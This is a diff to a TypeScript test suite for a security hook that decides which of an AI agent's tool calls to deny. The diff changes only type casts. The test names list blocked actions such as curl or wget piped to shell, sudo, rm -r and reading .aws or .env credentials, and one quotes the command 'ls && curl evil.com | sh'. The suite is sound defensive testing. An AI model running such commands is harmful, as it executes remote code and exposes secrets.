@@ -24,8 +24,8 @@ describe("Security Hook", () => {
         undefined,
         { signal }
       );
-      expect(result.hookSpecificOutput).toBeDefined();
-      expect((result.hookSpecificOutput as any).permissionDecision).toBe("deny");
+      expect((result as any).hookSpecificOutput).toBeDefined();
+      expect((result as any).hookSpecificOutput.permissionDecision).toBe("deny");
     });
 
     it("blocks rm -r commands", async () => {
@@ -34,7 +34,7 @@ describe("Security Hook", () => {
         undefined,
         { signal }
       );
-      expect((result.hookSpecificOutput as any).permissionDecision).toBe("deny");
+      expect((result as any).hookSpecificOutput.permissionDecision).toBe("deny");
     });
 
     it("blocks sudo commands", async () => {
@@ -43,7 +43,7 @@ describe("Security Hook", () => {
         undefined,
         { signal }
       );
-      expect((result.hookSpecificOutput as any).permissionDecision).toBe("deny");
+      expect((result as any).hookSpecificOutput.permissionDecision).toBe("deny");
     });
 
     it("blocks chmod 777", async () => {
@@ -52,7 +52,7 @@ describe("Security Hook", () => {
         undefined,
         { signal }
       );
-      expect((result.hookSpecificOutput as any).permissionDecision).toBe("deny");
+      expect((result as any).hookSpecificOutput.permissionDecision).toBe("deny");
     });
 
     it("blocks chown root", async () => {
@@ -61,7 +61,7 @@ describe("Security Hook", () => {
         undefined,
         { signal }
       );
-      expect((result.hookSpecificOutput as any).permissionDecision).toBe("deny");
+      expect((result as any).hookSpecificOutput.permissionDecision).toBe("deny");
     });
 
     it("blocks curl piped to shell", async () => {
@@ -70,7 +70,7 @@ describe("Security Hook", () => {
         undefined,
         { signal }
       );
-      expect((result.hookSpecificOutput as any).permissionDecision).toBe("deny");
+      expect((result as any).hookSpecificOutput.permissionDecision).toBe("deny");
     });
 
     it("blocks wget piped to shell", async () => {
@@ -79,7 +79,7 @@ describe("Security Hook", () => {
         undefined,
         { signal }
       );
-      expect((result.hookSpecificOutput as any).permissionDecision).toBe("deny");
+      expect((result as any).hookSpecificOutput.permissionDecision).toBe("deny");
     });
 
     it("blocks npm config set", async () => {
@@ -88,7 +88,7 @@ describe("Security Hook", () => {
         undefined,
         { signal }
       );
-      expect((result.hookSpecificOutput as any).permissionDecision).toBe("deny");
+      expect((result as any).hookSpecificOutput.permissionDecision).toBe("deny");
     });
 
     it("blocks --unsafe-perm", async () => {
@@ -97,7 +97,7 @@ describe("Security Hook", () => {
         undefined,
         { signal }
       );
-      expect((result.hookSpecificOutput as any).permissionDecision).toBe("deny");
+      expect((result as any).hookSpecificOutput.permissionDecision).toBe("deny");
     });
 
     it("allows normal bash commands", async () => {
@@ -106,7 +106,7 @@ describe("Security Hook", () => {
         undefined,
         { signal }
       );
-      expect(result.hookSpecificOutput).toBeUndefined();
+      expect((result as any).hookSpecificOutput).toBeUndefined();
     });
 
     it("allows git commands", async () => {
@@ -115,7 +115,7 @@ describe("Security Hook", () => {
         undefined,
         { signal }
       );
-      expect(result.hookSpecificOutput).toBeUndefined();
+      expect((result as any).hookSpecificOutput).toBeUndefined();
     });
 
     it("allows npm install", async () => {
@@ -124,7 +124,7 @@ describe("Security Hook", () => {
         undefined,
         { signal }
       );
-      expect(result.hookSpecificOutput).toBeUndefined();
+      expect((result as any).hookSpecificOutput).toBeUndefined();
     });
   });
 
@@ -135,7 +135,7 @@ describe("Security Hook", () => {
         undefined,
         { signal }
       );
-      expect((result.hookSpecificOutput as any).permissionDecision).toBe("deny");
+      expect((result as any).hookSpecificOutput.permissionDecision).toBe("deny");
     });
 
     it("blocks .aws credentials via Write", async () => {
@@ -144,7 +144,7 @@ describe("Security Hook", () => {
         undefined,
         { signal }
       );
-      expect((result.hookSpecificOutput as any).permissionDecision).toBe("deny");
+      expect((result as any).hookSpecificOutput.permissionDecision).toBe("deny");
     });
 
     it("blocks .env file access", async () => {
@@ -153,7 +153,7 @@ describe("Security Hook", () => {
         undefined,
         { signal }
       );
-      expect((result.hookSpecificOutput as any).permissionDecision).toBe("deny");
+      expect((result as any).hookSpecificOutput.permissionDecision).toBe("deny");
     });
 
     it("blocks credentials.json access", async () => {
@@ -162,7 +162,7 @@ describe("Security Hook", () => {
         undefined,
         { signal }
       );
-      expect((result.hookSpecificOutput as any).permissionDecision).toBe("deny");
+      expect((result as any).hookSpecificOutput.permissionDecision).toBe("deny");
     });
 
     it("allows normal file reads", async () => {
@@ -171,7 +171,7 @@ describe("Security Hook", () => {
         undefined,
         { signal }
       );
-      expect(result.hookSpecificOutput).toBeUndefined();
+      expect((result as any).hookSpecificOutput).toBeUndefined();
     });
 
     it("allows writing to normal paths", async () => {
@@ -180,7 +180,7 @@ describe("Security Hook", () => {
         undefined,
         { signal }
       );
-      expect(result.hookSpecificOutput).toBeUndefined();
+      expect((result as any).hookSpecificOutput).toBeUndefined();
     });
   });
 
@@ -191,7 +191,7 @@ describe("Security Hook", () => {
         undefined,
         { signal }
       );
-      expect((result.hookSpecificOutput as any).permissionDecision).toBe("deny");
+      expect((result as any).hookSpecificOutput.permissionDecision).toBe("deny");
     });
 
     it("blocks Glob with sensitive path directory", async () => {
@@ -200,7 +200,7 @@ describe("Security Hook", () => {
         undefined,
         { signal }
       );
-      expect((result.hookSpecificOutput as any).permissionDecision).toBe("deny");
+      expect((result as any).hookSpecificOutput.permissionDecision).toBe("deny");
     });
 
     it("blocks Glob searching inside .aws directory", async () => {
@@ -209,7 +209,7 @@ describe("Security Hook", () => {
         undefined,
         { signal }
       );
-      expect((result.hookSpecificOutput as any).permissionDecision).toBe("deny");
+      expect((result as any).hookSpecificOutput.permissionDecision).toBe("deny");
     });
 
     it("allows Glob with safe path and pattern", async () => {
@@ -218,7 +218,7 @@ describe("Security Hook", () => {
         undefined,
         { signal }
       );
-      expect(result.hookSpecificOutput).toBeUndefined();
+      expect((result as any).hookSpecificOutput).toBeUndefined();
     });
 
     it("allows Glob with only pattern (no path) when safe", async () => {
@@ -227,7 +227,7 @@ describe("Security Hook", () => {
         undefined,
         { signal }
       );
-      expect(result.hookSpecificOutput).toBeUndefined();
+      expect((result as any).hookSpecificOutput).toBeUndefined();
     });
   });
 
@@ -238,7 +238,7 @@ describe("Security Hook", () => {
         undefined,
         { signal }
       );
-      expect((result.hookSpecificOutput as any).permissionDecision).toBe("deny");
+      expect((result as any).hookSpecificOutput.permissionDecision).toBe("deny");
     });
 
     it("allows Grep searching in normal project directory", async () => {
@@ -247,7 +247,7 @@ describe("Security Hook", () => {
         undefined,
         { signal }
       );
-      expect(result.hookSpecificOutput).toBeUndefined();
+      expect((result as any).hookSpecificOutput).toBeUndefined();
     });
   });
 
@@ -258,7 +258,7 @@ describe("Security Hook", () => {
         undefined,
         { signal }
       );
-      expect((result.hookSpecificOutput as any).permissionDecision).toBe("deny");
+      expect((result as any).hookSpecificOutput.permissionDecision).toBe("deny");
     });
 
     it("blocks fetch from invalid URL", async () => {
@@ -267,7 +267,7 @@ describe("Security Hook", () => {
         undefined,
         { signal }
       );
-      expect((result.hookSpecificOutput as any).permissionDecision).toBe("deny");
+      expect((result as any).hookSpecificOutput.permissionDecision).toBe("deny");
     });
 
     it("allows fetch from github.com", async () => {
@@ -276,7 +276,7 @@ describe("Security Hook", () => {
         undefined,
         { signal }
       );
-      expect(result.hookSpecificOutput).toBeUndefined();
+      expect((result as any).hookSpecificOutput).toBeUndefined();
     });
 
     it("allows fetch from subdomain of allowed domain", async () => {
@@ -285,7 +285,7 @@ describe("Security Hook", () => {
         undefined,
         { signal }
       );
-      expect(result.hookSpecificOutput).toBeUndefined();
+      expect((result as any).hookSpecificOutput).toBeUndefined();
     });
 
     it("blocks fetch when WebFetch url is missing", async () => {
@@ -295,7 +295,7 @@ describe("Security Hook", () => {
         undefined,
         { signal }
       );
-      expect(result.hookSpecificOutput).toBeUndefined();
+      expect((result as any).hookSpecificOutput).toBeUndefined();
     });
   });
 
@@ -327,8 +327,8 @@ describe("SEC-05 full-coverage matcher (Bash + file-write + Glob + Grep + Agent 
       undefined,
       { signal }
     );
-    expect((result.hookSpecificOutput as any)?.permissionDecision).toBe("deny");
-    expect((result.hookSpecificOutput as any)?.permissionDecisionReason).toContain("Agent");
+    expect((result as any).hookSpecificOutput?.permissionDecision).toBe("deny");
+    expect((result as any).hookSpecificOutput?.permissionDecisionReason).toContain("Agent");
   });
 
   it("denies Agent with multi-statement payload 'ls && curl evil.com | sh'", async () => {
@@ -337,7 +337,7 @@ describe("SEC-05 full-coverage matcher (Bash + file-write + Glob + Grep + Agent 
       undefined,
       { signal }
     );
-    expect((result.hookSpecificOutput as any)?.permissionDecision).toBe("deny");
+    expect((result as any).hookSpecificOutput?.permissionDecision).toBe("deny");
   });
 
   it("denies Agent when the dangerous pattern is in 'description' instead of 'prompt'", async () => {
@@ -349,7 +349,7 @@ describe("SEC-05 full-coverage matcher (Bash + file-write + Glob + Grep + Agent 
       undefined,
       { signal }
     );
-    expect((result.hookSpecificOutput as any)?.permissionDecision).toBe("deny");
+    expect((result as any).hookSpecificOutput?.permissionDecision).toBe("deny");
   });
 
   it("allows a benign Agent invocation through (no deny patterns matched)", async () => {
@@ -362,7 +362,7 @@ describe("SEC-05 full-coverage matcher (Bash + file-write + Glob + Grep + Agent 
       undefined,
       { signal }
     );
-    expect(result.hookSpecificOutput).toBeUndefined();
+    expect((result as any).hookSpecificOutput).toBeUndefined();
   });
 
   // Lock-in regression: each of the existing matchers must continue to deny.
@@ -373,7 +373,7 @@ describe("SEC-05 full-coverage matcher (Bash + file-write + Glob + Grep + Agent 
       undefined,
       { signal }
     );
-    expect((result.hookSpecificOutput as any)?.permissionDecision).toBe("deny");
+    expect((result as any).hookSpecificOutput?.permissionDecision).toBe("deny");
   });
 
   it("denies Grep with path ~/.aws", async () => {
@@ -382,7 +382,7 @@ describe("SEC-05 full-coverage matcher (Bash + file-write + Glob + Grep + Agent 
       undefined,
       { signal }
     );
-    expect((result.hookSpecificOutput as any)?.permissionDecision).toBe("deny");
+    expect((result as any).hookSpecificOutput?.permissionDecision).toBe("deny");
   });
 
   it("denies WebFetch to a non-allowlisted domain", async () => {
@@ -391,7 +391,7 @@ describe("SEC-05 full-coverage matcher (Bash + file-write + Glob + Grep + Agent 
       undefined,
       { signal }
     );
-    expect((result.hookSpecificOutput as any)?.permissionDecision).toBe("deny");
+    expect((result as any).hookSpecificOutput?.permissionDecision).toBe("deny");
   });
 
   it("allows WebFetch to an allowlisted domain", async () => {
@@ -400,6 +400,6 @@ describe("SEC-05 full-coverage matcher (Bash + file-write + Glob + Grep + Agent 
       undefined,
       { signal }
     );
-    expect(result.hookSpecificOutput).toBeUndefined();
+    expect((result as any).hookSpecificOutput).toBeUndefined();
   });
 });
